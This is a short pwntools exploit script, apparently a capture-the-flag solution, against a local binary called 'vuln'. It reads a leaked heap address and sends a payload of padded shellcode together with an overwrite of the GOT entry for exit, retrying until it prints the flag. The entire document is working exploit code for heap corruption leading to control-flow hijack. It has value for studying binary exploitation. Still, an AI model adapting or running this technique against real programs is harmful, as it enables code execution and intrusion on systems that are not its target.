#! /usr/bin/env python2

from pwn import *

context.log_level = logging.CRITICAL

while True:
    try:
        p = process("./vuln")
        p.recvuntil("\n")
        #heap base address
        addr = int(p.recvuntil('\n'))
        #12 bytes padding, shellcode
        shellcode = "FFFFFFFFFFFF\x68\x56\x89\x04\x08\xC3\x90"
        #[address of exit in got - 12][heap base address]
        overwrite = p32(0x0804d020) + p32(addr)
        payload = shellcode + overwrite
        print(payload.encode('hex'))
        p.sendline(payload)
        p.recvuntil('an overflow will not be very useful...\n')
        print("Flag: " + p.recvuntil('}'))
        p.close()
        break
    except:
        p.close()